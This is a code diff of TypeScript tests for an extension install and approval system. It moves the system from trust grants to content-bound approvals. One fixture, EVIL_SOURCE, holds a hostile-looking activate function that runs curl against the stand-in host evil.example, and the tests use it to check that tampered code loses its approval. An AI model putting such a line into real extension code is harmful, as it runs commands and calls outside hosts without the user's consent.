@@ -14,10 +14,11 @@ import {
   writeExtensionFolder,
 } from '../../../tests/extension-folder'
 import type { ModuleSigningKeyPair } from '../../../packages/extension-sdk/src/signing'
-import { extensionContentSync, type ModuleTrustContext } from './module-signature'
+import { extensionContentSync, type ExtensionStandingContext } from './module-signature'
+import { approvedContext } from './extension-approvals.test-helper'
 import { discoverUserModules, discoverUserModulesSync, installModuleFolder } from './user-module-registry'
 
-const EMPTY_TRUST: ModuleTrustContext = { trustedModules: new Map() }
+const EMPTY_TRUST: ExtensionStandingContext = { approvals: new Map() }
 const EVIL_SOURCE = "exports.activate = () => require('child_process').exec('curl https://evil.example')\n"
 
 // The next minor Studio after the newest this one reads.
@@ -35,17 +36,11 @@ async function withTempDir<T>(fn: (dir: string) => Promise<T>): Promise<T> {
   }
 }
 
-function keyTrust(signer: ModuleSigningKeyPair): ModuleTrustContext {
-  return { trustedModules: new Map(), trustedKeyFingerprints: new Set([signer.fingerprint]) }
+function keyTrust(signer: ModuleSigningKeyPair): ExtensionStandingContext {
+  return { approvals: new Map(), trustedKeyFingerprints: new Set([signer.fingerprint]) }
 }
 
-function grantFor(key: string, folder: string): ModuleTrustContext {
-  const content = extensionContentSync(folder)
-  assert.ok(content.ok)
-  return { trustedModules: new Map([[key, content.fingerprint]]) }
-}
-
-test('an unsigned extension installs as local.<id>, untrusted, and is discovered', async () => {
+test('an unsigned extension installs as local.<id>, waiting for approval, and is discovered', async () => {
   await withTempDir(async (dir) => {
     const src = writeExtensionFolder(join(dir, 'anything'))
     const root = join(dir, 'extensions')
@@ -54,7 +49,8 @@ test('an unsigned extension installs as local.<id>, untrusted, and is discovered
     assert.equal(install.ok, true)
     if (install.ok) {
       assert.equal(install.id, 'local.demo')
-      assert.equal(install.trust.status, 'unsigned', 'a fresh unsigned extension is untrusted')
+      assert.equal(install.standing.signature, 'unsigned')
+      assert.equal(install.standing.approval.state, 'pending', 'a fresh extension waits for approval')
       assert.deepEqual(install.strippedLinks, [])
     }
     assert.equal(existsSync(join(root, 'local.demo', 'extension.json')), true)
@@ -68,7 +64,8 @@ test('an unsigned extension installs as local.<id>, untrusted, and is discovered
     assert.equal(module!.publisher, 'local')
     assert.equal(module!.extension.id, 'demo')
     assert.equal(module!.moduleRoot, join(root, 'local.demo'))
-    assert.equal(module!.trust.status, 'unsigned')
+    assert.equal(module!.standing.signature, 'unsigned')
+    assert.equal(module!.standing.approval.state, 'pending')
     assert.deepEqual(module!.manifest, {
       id: 'local.demo',
       displayName: 'Demo',
@@ -77,7 +74,7 @@ test('an unsigned extension installs as local.<id>, untrusted, and is discovered
       summary: 'A demo.',
       defaultEnabled: true,
       source: 'third-party',
-      permissions: ['storage'],
+      permissions: ['storage:own'],
     })
     assert.equal(listed.rejected.length, 0)
 
@@ -86,7 +83,7 @@ test('an unsigned extension installs as local.<id>, untrusted, and is discovered
       syncListed.modules.map((m) => m.key),
       ['local.demo'],
     )
-    assert.equal(syncListed.modules[0]!.trust.status, 'unsigned')
+    assert.equal(syncListed.modules[0]!.standing.approval.state, 'pending')
     assert.equal(syncListed.rejected.length, 0)
   })
 })
@@ -125,34 +122,36 @@ test('a reinstall replaces the folder rather than merging into it', async () => 
   })
 })
 
-test('a grant trusts the content it was given for, and nothing else', async () => {
+test('an approval covers the extension as it was approved, and nothing else', async () => {
   await withTempDir(async (dir) => {
     const root = join(dir, 'extensions')
     const moduleRoot = writeExtensionFolder(join(root, 'local.demo'))
-    const granted = grantFor('local.demo', moduleRoot)
-    const trusted = (await discoverUserModules(root, granted)).modules[0]!.trust
-    assert.equal(trusted.status, 'trusted')
-    assert.equal(trusted.via, 'grant')
-    // A stale/wrong fingerprint does not trust.
-    const stale = await discoverUserModules(root, { trustedModules: new Map([['local.demo', 'deadbeef']]) })
-    assert.equal(stale.modules[0]!.trust.status, 'unsigned')
-    // Swapping the code voids the grant.
+    const approved = approvedContext({ 'local.demo': moduleRoot })
+    const standing = (await discoverUserModules(root, approved)).modules[0]!.standing
+    assert.equal(standing.approval.state, 'approved')
+    // A stale fingerprint approves nothing.
+    const record = approved.approvals.get('local.demo')!
+    const stale = await discoverUserModules(root, {
+      approvals: new Map([['local.demo', { ...record, fingerprint: 'sha256-deadbeef' }]]),
+    })
+    assert.equal(stale.modules[0]!.standing.approval.state, 'pending')
+    // Swapping the code voids the approval.
     await writeFile(join(moduleRoot, 'dist', 'main.cjs'), EVIL_SOURCE)
-    assert.equal((await discoverUserModules(root, granted)).modules[0]!.trust.status, 'unsigned')
+    assert.equal((await discoverUserModules(root, approved)).modules[0]!.standing.approval.state, 'pending')
   })
 })
 
-test('the install result carries the content fingerprint a grant binds to', async () => {
+test('the install result carries the content digest an approval binds to', async () => {
   await withTempDir(async (dir) => {
     const src = writeExtensionFolder(join(dir, 'src'), { signer: newExtensionSigner() })
     const root = join(dir, 'extensions')
     const install = await installModuleFolder(src, root, EMPTY_TRUST)
     assert.equal(install.ok, true)
     if (!install.ok) return
-    assert.equal(install.trust.status, 'signed')
+    assert.equal(install.standing.signature, 'signed')
     const content = extensionContentSync(join(root, 'local.demo'))
     assert.ok(content.ok)
-    assert.equal(install.trust.contentFingerprint, content.fingerprint)
+    assert.equal(install.standing.contentDigest, content.fingerprint)
   })
 })
 
@@ -171,7 +170,7 @@ test('an id only Studio’s own catalogue installs is refused from a folder', as
   })
 })
 
-test('a signed extension from a trusted publisher key installs trusted', async () => {
+test('a signature by a trusted publisher key is a badge: the extension still waits for approval', async () => {
   await withTempDir(async (dir) => {
     const signer = newExtensionSigner()
     const src = writeExtensionFolder(join(dir, 'src'), { signer })
@@ -179,11 +178,11 @@ test('a signed extension from a trusted publisher key installs trusted', async (
     const install = await installModuleFolder(src, root, keyTrust(signer))
     assert.equal(install.ok, true)
     if (!install.ok) return
-    assert.equal(install.trust.status, 'trusted')
+    assert.equal(install.standing.signature, 'verified')
     const listed = await discoverUserModules(root, keyTrust(signer))
-    assert.equal(listed.modules[0]!.trust.status, 'trusted')
-    assert.equal(listed.modules[0]!.trust.via, 'publisher')
-    assert.equal(listed.modules[0]!.trust.fingerprint, signer.fingerprint)
+    assert.equal(listed.modules[0]!.standing.signature, 'verified')
+    assert.equal(listed.modules[0]!.standing.signer, signer.fingerprint)
+    assert.equal(listed.modules[0]!.standing.approval.state, 'pending')
   })
 })
 
@@ -241,8 +240,8 @@ test('symbolic links are left out of the copy and reported', async () => {
     assert.equal(existsSync(join(root, 'local.demo', 'dist', 'linked.cjs')), false)
     assert.equal(existsSync(join(root, 'local.demo', 'top-link.cjs')), false)
     assert.equal(existsSync(join(root, 'local.demo', 'dist', 'main.cjs')), true)
-    // What was installed has no link left in it, so it has a content identity to trust.
-    assert.equal(typeof install.trust.contentFingerprint, 'string')
+    // What was installed has no link left in it, so it has a content identity to approve.
+    assert.equal(typeof install.standing.contentDigest, 'string')
   })
 })
 
